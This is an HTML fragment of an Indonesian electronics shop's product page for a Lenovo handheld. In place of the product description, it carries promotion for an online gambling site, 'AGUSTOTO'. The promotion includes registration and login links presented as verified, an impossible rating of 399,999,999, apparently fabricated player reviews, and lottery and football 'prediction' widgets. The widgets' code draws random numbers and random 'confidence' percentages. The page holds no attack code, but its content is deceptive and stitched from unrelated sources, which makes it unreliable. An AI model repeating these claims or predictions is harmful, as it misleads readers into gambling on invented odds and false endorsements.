            <div class="pd-qr-print" style="display:none;"><div class="pd-qr-label">Scan untuk lihat produk:</div><img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=https%3A%2F%2Fplazait.co.id%2Fproduct%2Flenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-black" alt="QR Code" class="pd-qr-image"></div>
            </div>
                                    <div id="pd-variants-anchor"></div>

                        

            <div class="pd-compare-section">
                <button type="button" class="pd-compare-btn" id="pd-compare-btn" data-product-id="325">
                    <svg class="compare-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M21,9L17,5V8H10V10H17V13M7,11L3,15L7,19V16H14V14H7V11Z"/>
                    </svg>
                    <span class="compare-text">Bandingkan Produk</span>
                    <span class="compare-remove" hidden>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
                        </svg>
                        Hapus dari Perbandingan
                    </span>
                </button>
                <div class="pd-compare-info">
                    <small class="compare-note" id="compare-note">Bandingkan hingga 5 produk dengan bantuan AI</small>
                </div>
            </div>
            
            <div class="pd-short-desc"><p><strong>Informasi AGUSTOTO:</strong></p><ul><li>Minimal Deposit: Rp.5.000,-</li><li>Jenis Permainan: Slot Gacor</li><li>Metode Pembayaran: Bank, QRIS, E-Wallet</li><li>Mata Uang: IDR (Indonesian Rupiah)</li><li>Jam Operasional: 24 Jam Nonstop</li><li>Total Rating: 399.999.999</li><li>Rating: â­â­â­â­â­</li><li>Daftar Buruan: <a href="https://shortt.ink/anakbinjai">Klik Disini</a></li></ul></div><div class="AGUSTOTO-container-v1 mini">
<div class="AGUSTOTO-container">

  <!-- HEADER -->
<div class="togel-container-v3 mini">
                    <div class="togel-machine-v3">
                        <h2 class="togel-title-v3">ðŸŽ¯ PREDIKSI TOGEL RESMI (SIMULASI) ðŸŽ¯</h2>

                        <div class="togel-controls-v3">
                            <label>
                                PASARAN
                                <select id="marketFilter">
                                    <option value="ALL">ALL PASARAN</option>
                                </select>
                            </label>

                            <label>
                                TIPE
                                <select id="typeFilter">
                                    <option value="4D">4D</option>
                                    <option value="3D">3D</option>
                                    <option value="2D">2D</option>
                                </select>
                            </label>

                            <label>
                                MIN CONF
                                <input id="minConf" type="number" min="50" max="99" step="1" value="70">
                            </label>

                            <button id="btnTogelRandom" type="button">
                                <span class="icon">ðŸŽ²</span> GENERATE
                            </button>
                        </div>

                        <div class="togel-main-result-v3" id="togelResult">
                            <div class="togel-status-v3" id="togelStatus">â€” READY â€”</div>

                            <div class="togel-highlight-box">
                                <div class="togel-col-left">
                                    <div class="k">Pasaran Rekomendasi</div>
                                    <div class="v-game" id="rMarket">-</div>

                                    <div class="provider-info">
                                        <span class="k-small">Tipe:</span>
                                        <span class="v-small" id="rType">-</span>
                                        <span class="k-small" style="margin-left:10px;">Conf:</span>
                                        <span class="v-small" id="rConf">-</span>
                                    </div>
                                </div>

                                <div class="togel-col-right">
                                    <div class="k-rtp">Angka Utama</div>
                                    <div class="v-rtp-huge" id="rAngka">-</div>
                                </div>
                            </div>

                            <div class="togel-details-v3">
                                <div class="togel-detail-item">
                                    <div class="k-detail">BBFS</div>
                                    <div class="v-detail" id="rBBFS">-</div>
                                </div>
                                <div class="togel-detail-item">
                                    <div class="k-detail">Angka Ikut</div>
                                    <div class="v-detail" id="rIkut">-</div>
                                </div>
                                <div class="togel-detail-item">
                                    <div class="k-detail">Shio</div>
                                    <div class="v-detail" id="rShio">-</div>
                                </div>
                            </div>

                            <div class="togel-tip-v3" id="rTip">
                                Tips: Ini simulasi hiburan. Tetap bijak & disiplin.
                            </div>
                        </div>

                        <div class="togel-alts-v3">
                            <div class="togel-alts-title-v3">3 Alternatif Angka</div>
                            <div class="togel-alt-list-v3" id="togelAltList"></div>
                        </div>

                        <div class="togel-note-v3">
                            Disclaimer: Hasil di halaman ini random (simulasi), bukan acuan hasil resmi.
                        </div>
                    </div>
                </div>

                <style>
                    @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700;800&display=swap");

                    /* ===============================
   WRAPPER
================================ */
                    .togel-container-v3 {
                        display: flex;
                        justify-content: center;
                        padding: 16px 10px;
                        font-family: "Orbitron", "Poppins", system-ui, sans-serif;
                    }

                    /* ===============================
   MACHINE CORE (RED ELEGANT)
================================ */
                    .togel-machine-v3 {
                        position: relative;
                        width: 100%;
                        max-width: 520px;
                        padding: 16px;
                        border-radius: 16px;
                        overflow: hidden;
                        isolation: isolate;
                        background: radial-gradient(circle at 15% 0%, rgba(18, 131, 206, 0.3), transparent 48%), radial-gradient(circle at 85% 100%, rgba(180, 0, 0, 0.18), transparent 55%), linear-gradient(123deg, #000000, #000000);
                        border: 1px solid rgba(18, 131, 206, 0.3);
                        box-shadow: inset 0 0 18px rgba(18, 131, 206, 0.3), 0 0 18px rgba(18, 131, 206, 0.3);
                        color: #dbdbdb;
                    }

                    /* HUD SWEEP */
                    .togel-machine-v3::before {
                        content: "";
                        position: absolute;
                        inset: 0;
                        background: linear-gradient(120deg, transparent 40%, rgba(18, 131, 206, 0.3), transparent 65%);
                        animation: hudSweep 7s linear infinite;
                        pointer-events: none;
                        opacity: .8;
                    }

                    /* ===============================
   TITLE
================================ */
                    .togel-title-v3 {
                        text-align: center;
                        margin: 0 0 12px;
                        font-size: 15px;
                        font-weight: 900;
                        letter-spacing: 1px;
                        text-shadow: 0 0 6px rgba(18, 131, 206, 0.3/ 90%);
                    }

                    /* ===============================
   CONTROLS
================================ */
                    .togel-controls-v3 {
                        display: grid;
                        grid-template-columns: 1fr 1fr;
                        gap: 10px;
                        padding: 12px;
                        border-radius: 14px;

                        background: rgba(0, 0, 0, 0.4);
                        border: 1px solid rgba(18, 131, 206, 0.3);
                        box-shadow: inset 0 0 14px rgba(18, 131, 206, 0.3 / 22%);
                    }

                    .togel-controls-v3 label {
                        display: grid;
                        gap: 6px;
                        font-size: 10px;
                        letter-spacing: .8px;
                        text-transform: uppercase;
                        color: #8adeff;
                    }

                    .togel-controls-v3 select,
                    .togel-controls-v3 input {
                        background: rgba(0 0 0 / 92%);
                        color: #c5c5c5;
                        border: 1px solid rgba(18, 131, 206, 0.3);
                        border-radius: 10px;
                        padding: 7px 9px;
                        font-weight: 700;
                        font-size: 12px;
                        outline: none;
                        box-shadow: inset 0 0 10px rgba(18, 131, 206, 0.3);
                    }

                    /* BUTTON */
                    #btnTogelRandom {
                        grid-column: span 2;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        gap: 8px;

                        background: linear-gradient(145deg, #8adeff, #8adeff);
                        border: none;
                        color: #000000;
                        font-weight: 900;
                        letter-spacing: .8px;
                        border-radius: 14px;
                        cursor: pointer;
                        padding: 10px 12px;
                        font-size: 12px;

                        box-shadow: 0 0 16px rgba(18, 131, 206, 0.3);
                        transition: .2s ease;
                    }

                    #btnTogelRandom:active {
                        transform: scale(.98);
                    }

                    #btnTogelRandom:disabled {
                        opacity: .75;
                        cursor: not-allowed;
                    }

                    /* ===============================
   MAIN RESULT
================================ */
                    .togel-main-result-v3 {
                        margin-top: 12px;
                        padding: 12px;
                        border-radius: 14px;

                        background: rgba(30, 0, 0, 0.78);
                        border: 1px solid rgba(18, 131, 206, 0.3);
                        box-shadow: inset 0 0 16px rgba(18, 131, 206, 0.3);
                    }

                    .togel-status-v3 {
                        text-align: center;
                        font-weight: 800;
                        letter-spacing: .8px;
                        color: #8adeff;
                        margin-bottom: 10px;
                        font-size: 11px;
                    }

                    .togel-highlight-box {
                        display: flex;
                        justify-content: space-between;
                        gap: 12px;
                        padding-bottom: 10px;
                        margin-bottom: 10px;
                        border-bottom: 1px dashed rgba(18, 131, 206, 0.3);
                    }

                    .k,
                    .k-rtp {
                        font-size: 10px;
                        color: #c7c7c7;
                        text-transform: uppercase;
                    }

                    .v-game {
                        font-size: 14px;
                        font-weight: 900;
                        color: #ffffff;
                        margin-top: 6px;
                        line-height: 1.2;
                    }

                    .provider-info {
                        margin-top: 8px;
                        font-size: 11px;
                        color: #d9d9d9;
                        opacity: .95;
                    }

                    .k-small {
                        color: #8adeff;
                        font-size: 10px;
                    }

                    .v-small {
                        color: #fff0f0;
                        font-weight: 900;
                    }

                    .v-rtp-huge {
                        font-size: 2.4em;
                        font-weight: 900;
                        color: #8adeff;
                        text-shadow: 0 0 10px rgba(0 0 0);
                        line-height: 1;
                        letter-spacing: 1px;
                    }

                    /* DETAILS */
                    .togel-details-v3 {
                        display: grid;
                        grid-template-columns: repeat(3, 1fr);
                        gap: 8px;
                        background: rgba(0, 0, 0, .30);
                        padding: 10px;
                        border-radius: 12px;
                    }

                    .k-detail {
                        font-size: 9px;
                        color: #8adeff;
                        text-transform: uppercase;
                    }

                    .v-detail {
                        font-size: 12px;
                        font-weight: 800;
                        color: #ffffff;
                        margin-top: 4px;
                        letter-spacing: .8px;
                    }

                    .togel-tip-v3 {
                        margin-top: 10px;
                        font-size: 10px;
                        color: #d9d9d9;
                        opacity: .9;
                        text-align: center;
                    }

                    /* ALTS */
                    .togel-alts-v3 {
                        margin-top: 12px;
                        padding: 12px;
                        border-radius: 14px;
                        background: rgba(0, 0, 0, .40);
                        border: 1px solid rgba(18, 131, 206, 0.3);
                    }

                    .togel-alts-title-v3 {
                        font-weight: 900;
                        color: #8adeff;
                        margin-bottom: 10px;
                        font-size: 12px;
                    }

                    .togel-alt-list-v3 {
                        display: grid;
                        grid-template-columns: 1fr;
                        gap: 8px;
                    }

                    .togel-alt-item {
                        background: rgba(30, 0, 0, .86);
                        border-radius: 12px;
                        padding: 10px;
                        border-left: 3px solid rgba(18, 131, 206, 0.3 / 90%);
                    }

                    .togel-alt-item .g {
                        font-weight: 900;
                        color: #c5c5c5;
                        font-size: 12px;
                    }

                    .togel-alt-item .p {
                        font-size: 10px;
                        color: #8adeff;
                        margin-top: 4px;
                    }

                    .togel-alt-item .r {
                        margin-top: 6px;
                        font-weight: 900;
                        color: #8adeff;
                        letter-spacing: .8px;
                        font-size: 12px;
                    }

                    .togel-note-v3 {
                        margin-top: 10px;
                        font-size: 10px;
                        color: #d9d9d9;
                        opacity: .85;
                        text-align: center;
                    }

                    /* MOBILE */
                    @media(max-width:420px) {
                        .togel-highlight-box {
                            flex-direction: column
                        }

                        .togel-details-v3 {
                            grid-template-columns: 1fr
                        }
                    }

                    /* ANIM */
                    @keyframes hudSweep {
                        0% {
                            transform: translateX(-110%)
                        }

                        100% {
                            transform: translateX(110%)
                        }
                    }

                    @keyframes pulse {
                        0% {
                            opacity: .55
                        }

                        50% {
                            opacity: 1
                        }

                        100% {
                            opacity: .55
                        }
                    }
                </style>

                <script>
                    /* ===============================
                       DATASET TOGEL (SIMULASI)
                    ================================ */
                    const TOGEL_MARKETS = [
                        { market: "Singapore", code: "SGP", open: "17:45", zone: "WIB" },
                        { market: "Hongkong", code: "HK", open: "22:45", zone: "WIB" },
                        { market: "Sydney", code: "SDY", open: "13:45", zone: "WIB" },
                        { market: "Macau", code: "MC", open: "16:00", zone: "WIB" },
                        { market: "Cambodia", code: "KHM", open: "10:45", zone: "WIB" },
                        { market: "Japan", code: "JP", open: "11:30", zone: "WIB" }
                    ];

                    const SHIO = ["Tikus", "Kerbau", "Macan", "Kelinci", "Naga", "Ular", "Kuda", "Kambing", "Monyet", "Ayam", "Anjing", "Babi"];

                    const $ = (q) => document.querySelector(q);
                    const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

                    function uniqueMarkets() {
                        return TOGEL_MARKETS.map(m => m.market);
                    }

                    function genDigits(len) {
                        let s = "";
                        for (let i = 0; i < len; i++) s += String(randInt(0, 9));
                        return s;
                    }

                    function genBBFS() {
                        const pool = [...Array(10)].map((_, i) => i);
                        const out = [];
                        for (let i = 0; i < 7; i++) {
                            const idx = randInt(0, pool.length - 1);
                            out.push(pool.splice(idx, 1)[0]);
                        }
                        return out.join("");
                    }

                    function genIkut() {
                        const pool = [...Array(10)].map((_, i) => i);
                        const out = [];
                        for (let i = 0; i < 4; i++) {
                            const idx = randInt(0, pool.length - 1);
                            out.push(pool.splice(idx, 1)[0]);
                        }
                        return out.join(" â€¢ ");
                    }

                    function simulateConfidence() {
                        return randInt(60, 96);
                    }

                    function applyFilters() {
                        const m = $("#marketFilter").value;
                        const minC = parseFloat($("#minConf").value || "0");

                        return TOGEL_MARKETS
                            .filter(x => (m === "ALL" || x.market === m))
                            .map(x => ({ ...x, conf: simulateConfidence() }))
                            .filter(x => x.conf >= minC);
                    }

                    function pickRandom(arr, n = 1) {
                        const copy = [...arr];
                        const out = [];
                        for (let i = 0; i < n && copy.length; i++) {
                            const idx = randInt(0, copy.length - 1);
                            out.push(copy.splice(idx, 1)[0]);
                        }
                        return out;
                    }

                    function formatAngka(type) {
                        if (type === "4D") return genDigits(4);
                        if (type === "3D") return genDigits(3);
                        return genDigits(2);
                    }

                    function renderMain(item, type) {
                        $("#rMarket").textContent = `${item.market} (${item.code}) â€¢ Open ${item.open} ${item.zone}`;
                        $("#rType").textContent = type;
                        $("#rConf").textContent = `${item.conf}%`;

                        $("#rAngka").textContent = formatAngka(type);
                        $("#rBBFS").textContent = genBBFS();
                        $("#rIkut").textContent = genIkut();
                        $("#rShio").textContent = SHIO[randInt(0, SHIO.length - 1)];
                        $("#rTip").textContent = "Tips: Ini simulasi hiburan. Tetap bijak & disiplin.";
                    }

                    function renderAlts(list, type) {
                        const wrap = $("#togelAltList");
                        wrap.innerHTML = "";
                        list.forEach(x => {
                            const el = document.createElement("div");
                            el.className = "togel-alt-item";
                            el.innerHTML = `
      <div class="g">${x.market} (${x.code})</div>
      <div class="p">Tipe ${type} â€¢ Conf <strong>${x.conf}%</strong></div>
      <div class="r">Angka: <strong>${formatAngka(type)}</strong></div>
    `;
                            wrap.appendChild(el);
                        });
                    }

                    function spinButton(btn, on) {
                        if (on) {
                            btn.disabled = true;
                            btn.dataset.text = btn.innerHTML;
                            btn.innerHTML = `<span class="icon">ðŸ”„</span> PROCESS...`;
                        } else {
                            btn.disabled = false;
                            btn.innerHTML = btn.dataset.text || `<span class="icon">ðŸŽ²</span> GENERATE`;
                        }
                    }

                    /* ===============================
                       INIT
                    ================================ */
                    (function init() {
                        const sel = $("#marketFilter");
                        uniqueMarkets().forEach(m => {
                            const o = document.createElement("option");
                            o.value = m; o.textContent = m;
                            sel.appendChild(o);
                        });

                        $("#btnTogelRandom").addEventListener("click", (e) => {
                            const btn = e.currentTarget;
                            const type = $("#typeFilter").value;
                            const filtered = applyFilters();
                            const st = $("#togelStatus");

                            if (!filtered.length) {
                                st.textContent = "â€” NO MATCH â€”";
                                st.style.color = "white";
                                renderAlts([], type);
                                $("#rMarket").textContent = "-";
                                $("#rType").textContent = type;
                                $("#rConf").textContent = "-";
                                $("#rAngka").textContent = "-";
                                $("#rBBFS").textContent = "-";
                                $("#rIkut").textContent = "-";
                                $("#rShio").textContent = "-";
                                return;
                            }

                            spinButton(btn, true);
                            st.textContent = "â€” GENERATING â€”";
                            st.style.animation = "pulse .6s linear infinite";
                            st.style.color = "white";

                            const t0 = setInterval(() => {
                                const temp = pickRandom(filtered, 1)[0];
                                $("#rMarket").textContent = `${temp.market} (${temp.code}) â€¢ Open ${temp.open} ${temp.zone}`;
                                $("#rType").textContent = type;
                                $("#rConf").textContent = `${temp.conf}%`;
                                $("#rAngka").textContent = formatAngka(type);
                                $("#rBBFS").textContent = genBBFS();
                                $("#rIkut").textContent = genIkut();
                                $("#rShio").textContent = SHIO[randInt(0, SHIO.length - 1)];
                            }, 85);

                            setTimeout(() => {
                                clearInterval(t0);

                                const picks = pickRandom(filtered, 4);
                                renderMain(picks[0], type);
                                renderAlts(picks.slice(1), type);

                                st.textContent = "â€” READY â€”";
                                st.style.animation = "";
                                st.style.color = "gold";
                                spinButton(btn, false);
                            }, 1200);
                        });

                        renderAlts([], "4D");
                    })();
                </script>

<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"1909e908a10849b7af66d8986368283e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f591dd59004a48eeafbe4ab22ac1a9da","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e160a7c7e3074d01bd34414603c53b23","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"7d1313fe7e8b4cc3ac480817ec77c2a1","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"7d1313fe7e8b4cc3ac480817ec77c2a1","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"57cb2e82efc64548a4a6bee0c0fb1166","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"51df3b17a746455f940c0b561e8c0c0b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>

<style>
body{background:#ebf2fc; font-family:Poppins,sans-serif; color:white;}
.AGUSTOTO-container{
max-width: 520px;
    margin: auto;
    padding: 15px;
    border-radius: 12px;
    background: #8adeff;
    border: 2px solid #8adeff;
    box-shadow: 0 0 20px #8adeff;
}

.AGUSTOTO-header{
  font-weight:900;
  text-align:center;
  color:#8adeff;
  text-shadow:0 0 12px #5f90d9;
  margin-bottom:12px;
}

.AGUSTOTO-controls{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:10px;
  margin-bottom:12px;
}
.AGUSTOTO-controls label{
  display:flex; flex-direction:column;
  font-size:11px; color:#8adeff;
}
.AGUSTOTO-controls select,
.AGUSTOTO-controls input{
  padding:8px;
  border-radius:8px;
  border:1px solid #8adeff;
  background:#2b0000;
  color:white;
}
#btnGenerate{
  grid-column:span 2;
  padding:12px;
  background:#5f90d9;
  border:none;
  color:black;
  font-weight:900;
  cursor:pointer;
  margin-top:5px;
  box-shadow:0 0 15px #8adeff;
}

.AGUSTOTO-result{
  margin-top:12px;
  padding:12px;
  border-radius:10px;
  background:rgba(255,0,0,0.05);
  border:1px solid #8adeff;
}

.AGUSTOTO-main div, .AGUSTOTO-details div{
  margin:5px 0;
}

#rPrediction{
  font-size:24px;
  font-weight:900;
  color:#5f90d9;
}

.AGUSTOTO-alts{
  margin-top:10px;
}
.AGUSTOTO-alts h4{margin-bottom:6px;}
#AGUSTOTOAltList div{
  background:#2b0000;
  padding:6px 10px;
  margin:3px 0;
  border-radius:8px;
  border-left:3px solid #5f90d9;
}
  .bank-tab.active, .bank-tab:hover {
    background: #8adeff;
    color: #fff;
    border-color: #8adeff;
    box-shadow: 0 3px 8adeff -4px rgb(18, 131, 206, 0.3 / 60%);
}

.AGUSTOTO-disclaimer{
  font-size:10px;
  margin-top:8px;
  text-align:center;
  color:#8adeff;
}
</style>

<script>
const leagues = ["Premier League","La Liga","Serie A"];
const tips = ["Analisis statistik tim","Performa terakhir","Cek head-to-head"];
function rand(arr){return arr[Math.floor(Math.random()*arr.length)];}

var _bgBtn=document.getElementById("btnGenerate");if(_bgBtn)_bgBtn.onclick=function(){
  const type = document.getElementById("betTypeFilter").value;
  const league = rand(leagues);

  let pred;
  if(type==="1X2") pred=rand(["1","X","2"]);
  else if(type==="OVER_UNDER") pred=rand(["Over","Under"]);
  else pred=rand(["Home -1","Away +1","Draw"]);

  document.getElementById("rLeague").innerText=league;
  document.getElementById("rPrediction").innerText=pred;
  document.getElementById("rBetType").innerText=type;
  document.getElementById("rConf").innerText=Math.floor(Math.random()*40+60)+"%";
  document.getElementById("rTip").innerText=rand(tips);
  document.getElementById("rOdds").innerText=(Math.random()*3+1).toFixed(2);

  // alternatif
  const alt=document.getElementById("AGUSTOTOAltList"); alt.innerHTML="";
  for(let i=0;i<3;i++){let d=document.createElement("div"); d.innerText=rand(["1","X","2"]); alt.appendChild(d);}
  
  document.getElementById("AGUSTOTOStatus").innerText="â€” READY â€”";
}
</script>


                        
            <div class="pwp-deals-section" id="pwp-deals-section" hidden data-product-id="325" data-variant-id="0" data-category-path="Komputer &amp; Laptop/Laptop/Gaming"><div class="pwp-deals-header"><svg class="pwp-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M21.41 11.58l-9-9C12.05 2.22 11.55 2 11 2H4c-1.1 0-2 .9-2 2v7c0 .55.22 1.05.59 1.42l9 9c.36.36.86.58 1.41.58.55 0 1.05-.22 1.41-.59l7-7c.37-.36.59-.86.59-1.41 0-.55-.23-1.06-.59-1.42zM5.5 7C4.67 7 4 6.33 4 5.5S4.67 4 5.5 4 7 4.67 7 5.5 6.33 7 5.5 7z"/></svg><div class="pwp-text"><h3 class="pwp-title">Penawaran Spesial PWP (Purchase with Purchase)</h3><p class="pwp-subtitle">Beli produk ini dan dapatkan produk pilihan dengan harga spesial</p></div></div><div class="pwp-deals-loading"><div class="pwp-spinner"></div><p>Memuat penawaran...</p></div><div class="pwp-deals-grid" id="pwp-deals-grid"></div><p class="pwp-cart-note">ðŸ’¡ Produk PWP dapat ditambahkan di halaman keranjang setelah produk ini dimasukkan</p></div>
        </div>
        </div>
        </section>

        <aside class="pd-sidebar">
            <div class="pd-side-card pd-buy-card">
                <form class="pd-buy-form" id="pd-buy-form" data-pid="325">
                    <input type="hidden" name="variant_id" id="pd-variant-id" value="0">
                    <div>
                        <label for="qty" class="qty-label">Qty</label>
                        <input type="number" id="qty" name="qty" value="0" min="1"
                               max="0"
                               disabled>
                    </div>
                    <div class="pd-actions">
                        <button type="submit" class="btn-add-cart" id="btn-add-cart" disabled>+ Keranjang</button>
                        <button type="button" class="btn-buy" id="btn-buy" data-id="278426" disabled >Beli</button>
                        <button type="button" class="btn-chat-icon" id="btn-chat-icon" aria-label="Tanya Produk" title="Tanya Produk"><svg viewBox="0 0 640 640" fill="currentColor"><path d="M320 128C241 128 175.3 185.3 162.3 260.7C171.6 257.7 181.6 256 192 256L208 256C234.5 256 256 277.5 256 304L256 400C256 426.5 234.5 448 208 448L192 448C139 448 96 405 96 352L96 288C96 164.3 196.3 64 320 64C443.7 64 544 164.3 544 288L544 456.1C544 522.4 490.2 576.1 423.9 576.1L336 576L304 576C277.5 576 256 554.5 256 528C256 501.5 277.5 480 304 480L336 480C362.5 480 384 501.5 384 528L384 528L424 528C463.8 528 496 495.8 496 456L496 435.1C481.9 443.3 465.5 447.9 448 447.9L432 447.9C405.5 447.9 384 426.4 384 399.9L384 303.9C384 277.4 405.5 255.9 432 255.9L448 255.9C458.4 255.9 468.3 257.5 477.7 260.6C464.7 185.3 399.1 127.9 320 127.9z"/></svg></button>
                                            </div>
                </form>
                <div class="paylater-promo paylater-promo-md paylater-desktop-only">
    <span class="paylater-icon">ðŸ’³</span>
    <span class="paylater-text">
        <strong>Autorized AGUSTOTO</strong>
        <small>Situs Resmi AGUSTOTO </small>
    </span>
</div>            </div>

                        
                        <div class="pd-side-card qoala-banner-card">
                <div class="qoala-banner">
                    <div class="qoala-banner-content">
                        <div class="qoala-icon">
                            <center><img src="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" alt="AGUSTOTO" class="qoala-shield-img"></center>
                        </div>
                        <div class="qoala-text">
                            <div class="qoala-title">Login AGUSTOTO</div>
                            <div class="qoala-subtitle">Verified</div>
                        </div>
                    </div>
                    <a href="https://shortt.ink/anakbinjai" class="qoala-cta"
                       data-ga-event="qoala_banner_click"
                       data-product-id="325"
                       data-product-name="AGUSTOTO"
                       data-category-path="Komputer &amp; Laptop/Laptop/Gaming" target="_blank">Info</a>
                </div>
<style>
.qoala-banner-card{padding:0;overflow:hidden}

.qoala-banner{
  background:linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  padding:12px 16px;
  display:flex;
  align-items:center;
  justify-content:space-between;
  color:white;
  text-decoration:none;
  min-height:60px;
}

.qoala-banner-content{
  display:flex;
  align-items:center;
  gap:12px;
}

.qoala-icon{
  display:flex;
  align-items:center;
  justify-content:center;
}

.qoala-shield-img{
  width:36px;
  height:36px;
  object-fit:contain;
  opacity:0.9;
}

.qoala-title{
  font-weight:600;
  font-size:14px;
  line-height:1.2;
}

.qoala-subtitle{
  font-size:12px;
  opacity:0.9;
  line-height:1.2;
}

.qoala-cta{
  background:rgba(18, 131, 206, 0.3);
  color:white;
  padding:6px 12px;
  border-radius:6px;
  font-size:12px;
  font-weight:600;
  text-decoration:none;
  transition:background 0.2s ease;
  border:1px solid rgba(18, 131, 206, 0.3);
}

.qoala-cta:hover{
  background:rgba(18, 131, 206, 0.3);
  color:white;
}

@media(max-width:768px){
  .qoala-banner{padding:10px 12px}
  .qoala-title{font-size:17px}
  .qoala-subtitle{font-size:11px}
}
</style>
            </div>
            
                        <div class="pd-side-card pd-installment-card2"
                 id="inst-card"
                 data-base-price="20789000"
                 data-zero-smart="0">
                <div class="inst-head">
                    <h3>Promo & Fitur AGUSTOTO</h3>
                                    </div>

                <div class="inst-bank-tabs" role="tablist" aria-label="Bank">
                    <button type="button" class="bank-tab active" data-bank="Lucky Draw" aria-selected="true">Lucky Draw</button>
                    <button type="button" class="bank-tab" data-bank="Lomba Panjat Turnover" aria-selected="false">Lomba Panjat Turnover</button>
                    <button type="button" class="bank-tab" data-bank="Prediksi Jitu" aria-selected="false">Prediksi Jitu</button>
                </div>

                <ul class="inst-month-list" id="inst-month-list" aria-label="Daftar cicilan per bulan"></ul>
                <div class="inst-note" id="inst-zero-note" style="display:none;">0% Cicilan khusus bank terpilih*</div>
            </div>
            
            <!-- MECHA BLUE FINAL BOSS REVIEW SLIDER -->
<div class="tnt-review-mecha">

<div class="tnt-header">
<h2>REVIEW PEMAIN AGUSTOTO</h2>

</div>

<div class="tnt-slider" id="tntSlider">

<div class="tnt-slide active">
  <div class="tnt-name">Soesilowati â€“ Surabaya</div>
  <div class="tnt-comment">"AGUSTOTO benar-benar memudahkan akses login bandar togel online terpercaya 24 jam nonstop antarmuka yang elegan dan proses masuk yang cepat membuat saya bisa bertaruh kapan saja tanpa gangguan teknis sehingga pengalaman bermain terasa lebih mewah dan efisien."</div>
</div>

<div class="tnt-slide">
  <div class="tnt-name">Haryadi Kumala â€“ Semarang</div>
  <div class="tnt-comment">"Saya mengapresiasi bagaimana AGUSTOTO menyediakan proses deposit cepat yang jelas dan transparan; konfirmasi transaksi berjalan instan sehingga waktu menunggu berkurang dan pemain bisa langsung fokus pada strategi permainan."</div>
</div>

<div class="tnt-slide">
  <div class="tnt-name">Hendra Alamsjah â€“ Makassar</div>
